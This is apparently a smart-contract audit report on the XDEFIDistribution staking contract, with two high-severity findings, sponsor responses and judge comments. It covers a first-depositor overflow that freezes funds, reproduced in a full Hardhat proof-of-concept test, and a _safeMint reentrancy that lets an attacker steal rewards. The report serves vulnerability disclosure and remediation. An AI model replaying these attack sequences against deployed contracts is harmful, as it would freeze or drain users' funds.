[H-01] Malicious early user/attacker can malfunction the contract and even freeze users’ funds in edge cases
Submitted by WatchPug
https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151
_pointsPerUnit+= ((newXDEFI*_pointsMultiplier) /totalUnitsCached);
In the current implementation,_pointsPerUnitcan be changed inupdateDistribution()which can be called by anyone.
A malicious early user canlock()with only1 weiof XDEFI and makes_pointsPerUnitto be very large, causing future users not to be able tolock()and/orunlock()anymore due to overflow in arithmetic related to_pointsMultiplier.
As a result, the contract can be malfunctioning and even freeze users’ funds in edge cases.
Proof of Concept
Given:
bonusMultiplierOf[30 days] = 100Alicelock()1 weiof XDEFI for 30 days as the first user of the contract. Got1units, andtotalUnitsnow is1;Alice sends170141183460469 weiofXDEFIto the contract and callsupdateDistribution():
_pointsPerUnit+= ((170141183460469*2**128) /1);
Bob tries tolock()1,100,000 * 1e18ofXDEFIfor 30 days, the tx will fail, as_pointsPerUnit * unitsoverlows;Boblock()1,000,000 * 1e18ofXDEFIfor 30 days;The rewarder sends250,000 * 1e18ofXDEFIto the contract and callsupdateDistribution():
_pointsPerUnit+= ((250_000*1e18*2**128) / (1_000_000*1e18+1));
30 days later, Bob tries to callunlock(), the tx will fail, as_pointsPerUnit * unitsoverflows.
Recommended Mitigation Steps
Uniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.
The same solution should work here, i.e., on constructor set an initial amount (like 1e8) fortotalUnits
https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44
constructor(addressXDEFI_,stringmemorybaseURI_,uint256zeroDurationPointBase_)ERC721("Locked XDEFI","lXDEFI") {require((XDEFI=XDEFI_) !=address(0),"INVALID_TOKEN");owner=msg.sender;baseURI=baseURI_;_zeroDurationPointBase=zeroDurationPointBase_;totalUnits=100_000_000;}
deluca-mike (XDEFI) confirmed:
This is a great catch! I just tested it:const{expect} =require("chai");const{ethers} =require("hardhat");consttotalSupply='240000000000000000000000000';consttoWei= (value,add=0,sub=0)=>(BigInt(value) *1_000_000_000_000_000_000n+BigInt(add) -BigInt(sub)).toString();describe("XDEFIDistribution", ()=>{it("Can overflow _pointsPerUnit",async()=>{const[god,alice,bob] =awaitethers.getSigners();constXDEFI=await(await(awaitethers.getContractFactory("XDEFI")).deploy("XDEFI","XDEFI",totalSupply)).deployed();constXDEFIDistribution=await(await(awaitethers.getContractFactory("XDEFIDistribution")).deploy(XDEFI.address,"https://www.xdefi.io/nfts/",0)).deployed();// Give each account 2,000,000 XDEFIawait(awaitXDEFI.transfer(alice.address,toWei(2_000_000))).wait();await(awaitXDEFI.transfer(bob.address,toWei(2_000_000))).wait();// bonusMultiplierOf[30 days] = 100await(awaitXDEFIDistribution.setLockPeriods([2592000], [100])).wait();// 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1;await(awaitXDEFI.connect(alice).approve(XDEFIDistribution.address,1)).wait();await(awaitXDEFIDistribution.connect(alice).lock(1,2592000,alice.address)).wait();expect(awaitXDEFIDistribution.balanceOf(alice.address)).to.equal('1');constnft1= (awaitXDEFIDistribution.tokenOfOwnerByIndex(alice.address,0)).toString();expect((awaitXDEFIDistribution.positionOf(nft1)).units).to.equal(1);// 2. Alice sends 170141183460469 wei of XDEFI to the contract and calls updateDistribution()await(awaitXDEFI.connect(alice).transfer(XDEFIDistribution.address,170141183460469)).wait();await(awaitXDEFIDistribution.connect(alice).updateDistribution()).wait();// 3. Bob tries to lock() 1,100,000 * 1e18 of XDEFI for 30 days, the tx will fail, as _pointsPerUnit * units overflowsawait(awaitXDEFI.connect(bob).approve(XDEFIDistribution.address,toWei(1_100_000))).wait();awaitexpect(XDEFIDistribution.connect(bob).lock(toWei(1_100_000),2592000,bob.address)).to.be.revertedWith("_toInt256Safe failed");// 4. Bob lock() 1,000,000 * 1e18 of XDEFI for 30 daysawait(awaitXDEFI.connect(bob).approve(XDEFIDistribution.address,toWei(1_000_000))).wait();await(awaitXDEFIDistribution.connect(bob).lock(toWei(1_000_000),2592000,bob.address)).wait();expect(awaitXDEFIDistribution.balanceOf(bob.address)).to.equal('1');constnft2= (awaitXDEFIDistribution.tokenOfOwnerByIndex(bob.address,0)).toString();expect((awaitXDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(1_000_000));// 5. The rewarder sends 250,000 * 1e18 of XDEFI to the contract and calls updateDistribution()await(awaitXDEFI.transfer(XDEFIDistribution.address,toWei(250_000))).wait();await(awaitXDEFIDistribution.updateDistribution()).wait();// 6. 30 days later, Bob tries to call unlock(), the tx will fail, as _pointsPerUnit * units overflows.awaithre.ethers.provider.send('evm_increaseTime', [2592000]);awaitexpect(XDEFIDistribution.connect(bob).unlock(nft2,bob.address)).to.be.revertedWith("_toInt256Safe failed");});});While I do like the suggestion to tototalUnits = 100_000_000;in the constructor, it will result “uneven” numbers due to thetotalUnitsoffset. I wonder if I can resolve this but just reducing_pointsMultipliertouint256(2**96)as perhttps://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728.
deluca-mike (XDEFI) commented:
OK, I think I can solve this with_pointsMultiplier = uint256(2**72):const{expect} =require("chai");const{ethers} =require("hardhat");consttotalSupply='240000000000000000000000000';consttoWei= (value,add=0,sub=0)=>(BigInt(value) *1_000_000_000_000_000_000n+BigInt(add) -BigInt(sub)).toString();describe("XDEFIDistribution", ()=>{it("Can overflow _pointsPerUnit",async()=>{const[god,alice,bob] =awaitethers.getSigners();constXDEFI=await(await(awaitethers.getContractFactory("XDEFI")).deploy("XDEFI","XDEFI",totalSupply)).deployed();constXDEFIDistribution=await(await(awaitethers.getContractFactory("XDEFIDistribution")).deploy(XDEFI.address,"https://www.xdefi.io/nfts/",0)).deployed();// Give each account 100M XDEFIawait(awaitXDEFI.transfer(alice.address,toWei(100_000_000))).wait();await(awaitXDEFI.transfer(bob.address,toWei(100_000_000))).wait();// bonusMultiplierOf[30 days] = 255await(awaitXDEFIDistribution.setLockPeriods([2592000], [255])).wait();// 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1await(awaitXDEFI.connect(alice).approve(XDEFIDistribution.address,1)).wait();await(awaitXDEFIDistribution.connect(alice).lock(1,2592000,alice.address)).wait();expect(awaitXDEFIDistribution.balanceOf(alice.address)).to.equal('1');constnft1= (awaitXDEFIDistribution.tokenOfOwnerByIndex(alice.address,0)).toString();expect((awaitXDEFIDistribution.positionOf(nft1)).units).to.equal(2);// 2. Alice sends 100M XDEFI minus 1 wei to the contract and calls updateDistribution()await(awaitXDEFI.connect(alice).transfer(XDEFIDistribution.address,toWei(100_000_000,0,1))).wait();await(awaitXDEFIDistribution.connect(alice).updateDistribution()).wait();// 3. Bob can lock() 100M XDEFI for 30 daysawait(awaitXDEFI.connect(bob).approve(XDEFIDistribution.address,toWei(100_000_000))).wait();await(awaitXDEFIDistribution.connect(bob).lock(toWei(100_000_000),2592000,bob.address)).wait();expect(awaitXDEFIDistribution.balanceOf(bob.address)).to.equal('1');constnft2= (awaitXDEFIDistribution.tokenOfOwnerByIndex(bob.address,0)).toString();expect((awaitXDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(255_000_000));// 4. The rewarder sends 40M XDEFI to the contract and calls updateDistribution()await(awaitXDEFI.transfer(XDEFIDistribution.address,toWei(40_000_000))).wait();await(awaitXDEFIDistribution.updateDistribution()).wait();// 5. 30 days later, Bob can call unlock()awaithre.ethers.provider.send('evm_increaseTime', [2592000]);await(awaitXDEFIDistribution.connect(bob).unlock(nft2,bob.address)).wait();});});
deluca-mike (XDEFI) commented:
In therelease candidate contract, in order to preserve the math (formulas), at the cost of some accuracy, we went with a_pointsMultiplierof 72 bits.Also, aminimum units lockedis enforced, to prevent “dust” from creating a very very high_pointsPerUnit.Tests were written in order to stress test the contract against the above extreme cases.Further, a “no-going-back”emergency mode setterwas implemented that allows (but does not force) users towithdraw only their depositswithout any of the funds distribution math from being expected, in the event that some an edge case does arise.
Ivshti (Judge) commented:
fantastic finding, agreed with the proposed severity!The sponsor fixes seem adequate: a lower_poinsMultiplier, a minimum lock and an emergency mode that disables reward math, somewhat similar to emergency withdraw functions in contracts like masterchef.
[H-02] The reentrancy vulnerability in _safeMint can allow an attacker to steal all rewards
Submitted by cccz, also found by cmichel, Fitraldys, kenzo, onewayfunction, and tqts
There is a reentrancy vulnerability in the _safeMint function
function_safeMint(addressto,uint256tokenId,bytesmemory_data)internalvirtual{_mint(to,tokenId);require(_checkOnERC721Received(address(0),to,tokenId,_data),"ERC721: transfer to non ERC721Receiver implementer");}...function_checkOnERC721Received(addressfrom,addressto,uint256tokenId,bytesmemory_data)privatereturns(bool) {if(to.isContract()) {tryIERC721Receiver(to).onERC721Received(_msgSender(),from,tokenId,_data)returns(bytes4retval) {returnretval==IERC721Receiver.onERC721Received.selector;
The lock function changes the totalDepositedXDEFI variable after calling the _safeMint function
functionlock(uint256amount_,uint256duration_,addressdestination_)externalnoReenterreturns(uint256tokenId_) {// Lock the XDEFI in the contract.SafeERC20.safeTransferFrom(IERC20(XDEFI),msg.sender,address(this),amount_);// Handle the lock position creation and get the tokenId of the locked position.return_lock(amount_,duration_,destination_);}...function_lock(uint256amount_,uint256duration_,addressdestination_)internalreturns(uint256tokenId_) {// Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.require(amount_!=uint256(0) &&amount_<=MAX_TOTAL_XDEFI_SUPPLY,"INVALID_AMOUNT");// Get bonus multiplier and check that it is not zero (which validates the duration).uint8bonusMultiplier=bonusMultiplierOf[duration_];require(bonusMultiplier!=uint8(0),"INVALID_DURATION");// Mint a locked staked position NFT to the destination._safeMint(destination_,tokenId_=_generateNewTokenId(_getPoints(amount_,duration_)));// Track deposits.totalDepositedXDEFI+=amount_;
Since the updateDistribution function does not use the noReenter modifier, the attacker can re-enter the updateDistribution function in the _safeMint function. Since the value of totalDepositedXDEFI is not updated at this time, the _pointsPerUnit variable will become abnormally large.
functionupdateDistribution()external{uint256totalUnitsCached=totalUnits;require(totalUnitsCached>uint256(0),"NO_UNIT_SUPPLY");uint256newXDEFI=_toUint256Safe(_updateXDEFIBalance());if(newXDEFI==uint256(0))return;_pointsPerUnit+= ((newXDEFI*_pointsMultiplier) /totalUnitsCached);emitDistributionUpdated(msg.sender,newXDEFI);}...function_updateXDEFIBalance()internalreturns(int256newFundsTokenBalance_) {uint256previousDistributableXDEFI=distributableXDEFI;uint256currentDistributableXDEFI=distributableXDEFI=IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;return_toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);}
If the attacker calls the lock function to get the NFT before exploiting the reentrance vulnerability, then the unlock function can be called to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function. Since the unlock function calls the _updateXDEFIBalance function, the attacker cannot steal the assets deposited by the user
functionunlock(uint256tokenId_,addressdestination_)externalnoReenterreturns(uint256amountUnlocked_) {// Handle the unlock and get the amount of XDEFI eligible to withdraw.amountUnlocked_=_unlock(msg.sender,tokenId_);// Send the the unlocked XDEFI to the destination.SafeERC20.safeTransfer(IERC20(XDEFI),destination_,amountUnlocked_);// NOTE: This needs to be done after updating `totalDepositedXDEFI` (which happens in `_unlock`) and transferring out._updateXDEFIBalance();}...function_unlock(addressaccount_,uint256tokenId_)internalreturns(uint256amountUnlocked_) {// Check that the account is the position NFT owner.require(ownerOf(tokenId_) ==account_,"NOT_OWNER");// Fetch position.Positionstorageposition=positionOf[tokenId_];uint96units=position.units;uint88depositedXDEFI=position.depositedXDEFI;uint32expiry=position.expiry;// Check that enough time has elapsed in order to unlock.require(expiry!=uint32(0),"NO_LOCKED_POSITION");require(block.timestamp>=uint256(expiry),"CANNOT_UNLOCK");// Get the withdrawable amount of XDEFI for the position.amountUnlocked_=_withdrawableGiven(units,depositedXDEFI,position.pointsCorrection);// Track deposits.totalDepositedXDEFI-=uint256(depositedXDEFI);// Burn FDT Position.totalUnits-=units;deletepositionOf[tokenId_];emitLockPositionWithdrawn(tokenId_,account_,amountUnlocked_);}...function_withdrawableGiven(uint96units_,uint88depositedXDEFI_,int256pointsCorrection_)internalviewreturns(uint256withdrawableXDEFI_) {return(_toUint256Safe(_toInt256Safe(_pointsPerUnit*uint256(units_)) +pointsCorrection_) /_pointsMultiplier) +uint256(depositedXDEFI_);}
Proof of Concept
https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L253-L281
Recommended Mitigation Steps
-    function updateDistribution() external  {+    function updateDistribution() external  noReenter {
deluca-mike (XDEFI) resolved:
Valid and a big issue. However, due to other recommendations, I will not solve it this way. Instead,updateDistribution()will be called at the start of every lock/unlock function (so it can’t have anoReentermodifier), and the_safeMintcalls will be moved to the end of their respective operations to prevent the effect of the re-entrancy (i.e. position will created with a_pointsPerUnitbefore a re-entering from_safeMintcan affect it). Tests will be added to show this is not longer possible.
deluca-mike (XDEFI) commented:
In our release candidate contract, as mentioned above,updateDistribution()is called before each locking and unlocking function, via aupdatePointsPerUnitAtStartmodifier, and thus,updateDistribution()is now a public fucntion, and since it is used by other functions, cannot be behind anoReenter.See:locklockWithPermitrelockunlockrelockBatchunlockBatchAlso,a test was writtento ensure that this is no longer exploitable, and that the contract behaves properly if a re-entrancy callupdateDistribution().
Ivshti (Judge) commented:
Agreed with the severity.Resolution of reordering the calls seems to be adequate
